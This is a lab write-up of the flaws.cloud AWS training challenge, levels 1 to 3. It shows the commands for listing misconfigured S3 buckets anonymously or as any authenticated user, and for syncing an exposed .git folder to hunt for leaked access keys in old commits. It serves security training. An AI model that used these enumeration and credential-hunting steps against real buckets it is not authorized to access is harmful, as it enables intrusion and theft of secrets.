# Flaws

## Level 1
 
Use the command 

    $nslookup flaws.cloud 

to find the ip  address of the aws server flaws.cloud

Resultant ips :  

    Name:   flaws.cloud
    Address: 52.92.192.211
    Name:   flaws.cloud
    Address: 52.218.181.178
    Name:   flaws.cloud 
    Address: 52.218.153.82
    Name:   flaws.cloud
    Address: 52.92.249.155
    Name:   flaws.cloud
    Address: 52.218.229.98
    Name:   flaws.cloud
    Address: 52.218.196.163
    Name:   flaws.cloud
    Address: 52.92.181.83
    Name:   flaws.cloud
    Address: 52.218.240.99
Reverse lookup on the ip results on 
    
    name = s3-website-us-west-2.amazonaws.com
Using the command :

    $nslookup 52.218.181.178
    
Using the command:

    $aws s3 ls  s3://flaws.cloud/ --no-sign-request --region us-west-2
    
list the root files on the flaws.cloud as an anonymous id.

Result:

    2017-03-14 08:30:38       2575 hint1.html
    2017-03-03 09:35:17       1707 hint2.html
    2017-03-03 09:35:11       1101 hint3.html
    2020-05-22 23:46:45       3162 index.html
    2018-07-10 22:17:16      15979 logo.png
    2017-02-27 07:29:28         46 robots.txt
    2017-02-27 07:29:30       1051 secret-dd02c7c.html
    
    
Browse 

    https://flaws.cloud/secret-dd02c7c.html
    
to get into the next level

Link for the next level:

    http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
    
## Level 2

Create an account in aws as with free tier.

Create a Iam user with access key and secret access key after creating the account.

After creating the user try enquiring or list the root directory as a verified user from the terminal after setting the aws cli with access key and secret access key.

command for listing:

    $aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
   
Output be like:

    2017-02-27 07:32:15      80751 everyone.png
    2017-03-03 09:17:17       1433 hint1.html
    2017-02-27 07:34:39       1035 hint2.html
    2017-02-27 07:32:14       2786 index.html
    2017-02-27 07:32:14         26 robots.txt
    2017-02-27 07:32:15       1051 secret-e4443fc.html
    
After getting the result browse the secret file and you will get the link for the next level.

    http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html
    
## Level 3

To list the root dir files use the command:


    $aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
output:

                                PRE .git/
    2017-02-27 05:44:33     123637 authenticated_users.png
    2017-02-27 05:44:34       1552 hint1.html
    2017-02-27 05:44:34       1426 hint2.html
    2017-02-27 05:44:35       1247 hint3.html
    2017-02-27 05:44:33       1035 hint4.html
    2020-05-22 23:51:10       1861 index.html
    2017-02-27 05:44:33         26 robots.txt

Here we can a see a .git file, 

For accessing the git commands, we sync it with our local system using the command:
 
    $ aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud ./flaws

Navigate into that directory using the command:

    $cd flaws

After that, for finding access and secret key, we can use the command
     
     $git logs
     
output:

    commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
    Author: 0xdabbad00 <scott@summitroute.com>
    Date:   Sun Sep 17 09:10:43 2017 -0600

        Oops, accidentally added something I shouldn't have

    commit f52ec03b227ea6094b04e43f475fb0126edb5a61
    Author: 0xdabbad00 <scott@summitroute.com>
    Date:   Sun Sep 17 09:10:07 2017 -0600

        first commit
To change branch that was mentioned in the commit, follow the command

    $ git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
